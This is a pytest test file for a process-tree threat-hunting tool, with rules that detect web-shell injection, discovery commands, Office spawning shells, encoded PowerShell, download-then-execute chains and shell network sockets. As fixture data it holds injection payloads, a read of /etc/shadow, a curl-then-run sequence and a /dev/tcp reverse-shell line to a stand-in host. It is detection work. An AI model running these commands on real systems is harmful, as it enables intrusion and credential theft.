import base64
from pathlib import Path

import pytest

from ptree.hunts import (
    decode_powershell,
    discovery_from_unusual_parent,
    download_then_execute,
    encoded_powershell,
    office_spawns_shell,
    run_rules,
    shell_network,
    stack,
    web_shell_injection,
)
from ptree.parser import ZERO_GUID, Net, Proc, parse_file
from ptree.score import score_rules, score_stack, truth_keys
from ptree.tree import Forest

DATA = Path(__file__).resolve().parent.parent / "data"


class Tree:
    """Tiny builder: t.add('a', '/usr/bin/python3', cmd='...', parent=None)."""

    def __init__(self):
        self.procs = []

    def add(self, key, image, cmd=None, parent=None):
        n = len(self.procs)
        self.procs.append(
            Proc(key, n + 1, image, cmd or image, parent or ZERO_GUID, 0, "-", "", "", f"t{n:03d}", "h")
        )
        return self

    def forest(self):
        return Forest(self.procs)


def web_app():
    return Tree().add("web", "/usr/bin/python3.10", "python3 app.py")


def test_benign_web_shell_is_quiet():
    f = (
        web_app()
        .add("s", "/usr/bin/dash", "/bin/sh -c ping -c 1 10.0.0.1", "web")
        .add("p", "/usr/bin/ping", "ping -c 1 10.0.0.1", "s")
    )
    assert run_rules(f.forest()) == []


@pytest.mark.parametrize("payload", ["; id", "&& id", "| id", "`id`", "$(id)", "|| id"])
def test_web_shell_injection_on_chaining(payload):
    f = web_app().add("s", "/usr/bin/dash", f"/bin/sh -c ping -c 1 10.0.0.1{payload}", "web").forest()
    assert [a.rule for a in web_shell_injection(f)] == ["web_shell_injection"]


def test_chaining_in_a_normal_shell_is_not_injection():
    f = Tree().add("b", "/usr/bin/bash").add("s", "/usr/bin/dash", "sh -c 'tar c x; rm x'", "b").forest()
    assert web_shell_injection(f) == []


def test_discovery_grouped_per_web_server_and_severity():
    t = Tree().add("w3wp", r"C:\Windows\System32\inetsrv\w3wp.exe")
    for i, tool in enumerate(["whoami.exe", "systeminfo.exe", "net.exe"]):
        t.add(f"c{i}", r"C:\Windows\System32\cmd.exe", "cmd /c x", "w3wp").add(
            f"d{i}", rf"C:\Windows\System32\{tool}", tool, f"c{i}"
        )
    alerts = discovery_from_unusual_parent(t.forest())
    assert len(alerts) == 1 and alerts[0].severity == "high" and len(alerts[0].evidence) == 6


def test_one_discovery_command_is_medium_and_explorer_is_ignored():
    t = web_app().add("s", "/usr/bin/dash", "sh -c x", "web").add("i", "/usr/bin/id", "id", "s")
    t.add("e", r"C:\Windows\explorer.exe").add("c", r"C:\Windows\System32\cmd.exe", "cmd", "e")
    t.add("w", r"C:\Windows\System32\whoami.exe", "whoami", "c")
    alerts = discovery_from_unusual_parent(t.forest())
    assert [a.severity for a in alerts] == ["medium"]


def test_cat_counts_as_discovery_only_for_account_files():
    t = web_app().add("s", "/usr/bin/dash", "sh -c x", "web")
    t.add("a", "/usr/bin/cat", "cat /var/log/app.log", "s")
    assert discovery_from_unusual_parent(t.forest()) == []
    t.add("b", "/usr/bin/cat", "cat /etc/shadow", "s")
    assert len(discovery_from_unusual_parent(t.forest())) == 1


def test_office_child_shell_but_not_print_helper():
    word = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
    t = Tree().add("w", word).add("p", r"C:\Windows\splwow64.exe", "splwow64.exe 8192", "w")
    assert office_spawns_shell(t.forest()) == []
    t.add("m", r"C:\Windows\System32\mshta.exe", "mshta http://x", "w")
    assert [a.severity for a in office_spawns_shell(t.forest())] == ["critical"]


def test_encoded_powershell_is_decoded():
    enc = base64.b64encode("Get-Date".encode("utf-16-le")).decode()
    assert decode_powershell(f"powershell -nop -EncodedCommand {enc}") == "Get-Date"
    assert decode_powershell("powershell -enc !!!!notbase64!!!!") is None
    t = Tree().add("p", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", f"powershell -e {enc}")
    assert "Get-Date" in encoded_powershell(t.forest())[0].summary


def test_download_then_execute_needs_the_same_file_run_later():
    t = Tree().add("s", "/usr/bin/dash", "sh -c x")
    t.add("r", "/usr/bin/dash", "sh /tmp/a", "s")  # runs before the download: not this pattern
    t.add("c", "/usr/bin/curl", "curl -s -o /tmp/a http://x/a", "s")
    t.add("q", "/usr/bin/curl", "curl -s -o /dev/null http://x/health", "s")
    assert download_then_execute(t.forest()) == []
    t.add("x", "/usr/bin/dash", "sh /tmp/a", "s")
    alerts = download_then_execute(t.forest())
    assert len(alerts) == 1 and alerts[0].evidence == ["c", "x"]


def test_shell_network_one_alert_per_socket():
    t = web_app().add("s", "/usr/bin/dash", "sh -c x; bash -c 'exec 3<>/dev/tcp/h/1'", "web")
    t.add("b", "/usr/bin/bash", "bash -c exec 3<>/dev/tcp/h/1", "s")
    f = t.forest()
    nets = [Net("b", 3, "/usr/bin/bash", "10.0.0.2", "4444", "t")]
    alerts = shell_network(f, nets)
    assert [a.anchor for a in alerts] == ["b"]


def test_stacking_lists_only_new_chains():
    base = web_app().add("s", "/usr/bin/dash", "sh", "web").add("p", "/usr/bin/ping", "ping", "s").forest()
    inc = web_app().add("s", "/usr/bin/dash", "sh", "web").add("p", "/usr/bin/ping", "ping", "s")
    inc.add("i", "/usr/bin/id", "id", "s")
    assert [r.chain for r in stack(base, inc.forest())] == ["python3.10 > dash > id"]


@pytest.mark.parametrize("base", ["baseline.log", "windows_baseline.xml"])
def test_rules_are_quiet_on_real_and_synthetic_baselines(base):
    cap = parse_file(DATA / base)
    assert run_rules(Forest(cap.procs), cap.nets) == []


def test_linux_scorecard():
    cb, ci = parse_file(DATA / "baseline.log"), parse_file(DATA / "incident.log")
    fb, fi = Forest(cb.procs), Forest(ci.procs)
    truth = truth_keys(fi)
    rules = score_rules(fi, truth, run_rules(fi, ci.nets))
    stacked = score_stack(fi, truth, stack(fb, fi))
    assert (rules.steps_found, rules.steps_total, rules.false_findings) == (5, 5, 0)
    assert (stacked.steps_found, stacked.false_findings) == (4, 1)
    assert "cron.d" in stacked.missed[0]  # echo is a shell builtin: no process to stack


def test_stacking_false_finding_is_host_noise():
    fb, fi = Forest(parse_file(DATA / "baseline.log").procs), Forest(parse_file(DATA / "incident.log").procs)
    truth = truth_keys(fi)
    false = [r.chain for r in stack(fb, fi) if not set(r.keys) & truth]
    assert false == ["- > fstrim"]  # a Docker Desktop VM job seen through --pid=host


def test_windows_scorecard():
    ci = parse_file(DATA / "windows_incident.xml")
    fi = Forest(ci.procs)
    truth = truth_keys(fi, DATA / "windows_truth.txt")
    s = score_rules(fi, truth, run_rules(fi, ci.nets))
    assert (s.steps_found, s.steps_total, s.false_findings) == (4, 4, 0)
